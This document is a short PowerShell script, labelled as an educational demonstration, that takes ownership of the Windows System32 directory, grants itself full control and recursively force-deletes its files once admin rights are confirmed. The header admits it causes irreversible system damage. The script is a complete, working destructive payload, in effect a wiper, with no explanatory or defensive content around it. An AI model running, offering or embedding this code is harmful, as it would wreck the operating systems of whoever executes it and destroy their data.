# Warning: This script is for educational demonstration only
# It will cause irreversible system damage

function Remove-System32 {
    try {
        # Get System32 path
        $sys32 = "$env:SystemRoot\System32"
        
        # Take ownership of System32
        takeown /f "$sys32" /r /d y | Out-Null
        icacls "$sys32" /grant administrators:F /t | Out-Null
        
        # Start deletion of critical system files
        Get-ChildItem -Path $sys32 -Recurse | 
        ForEach-Object {
            try {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            } catch {
                # Continue even if some files are locked
                Write-Output "Skipped: $($_.FullName)"
            }
        }
        
        Write-Output "System32 deletion attempted"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Execute only if running as admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Requires administrative privileges"
    exit 1
}

Remove-System32
